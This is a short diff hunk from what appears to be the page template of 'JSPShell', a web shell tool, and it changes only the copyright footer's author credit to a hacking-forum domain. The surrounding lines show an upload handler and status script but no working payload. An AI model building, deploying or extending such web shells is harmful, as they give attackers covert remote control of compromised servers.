@@ -925,7 +925,7 @@ $click('upload-action', function () {
 $val($id('map2'), __list__);
 </script>
 <script><%= utils.showStatus() %></script>
-<div class=copyright>JSPShell &copy; 2020 | Author yuforever9@gmail.com</div>
+<div class=copyright>JSPShell &copy; 2020 | Author www.t00ls.net</div>
 </body>
 </html>
 
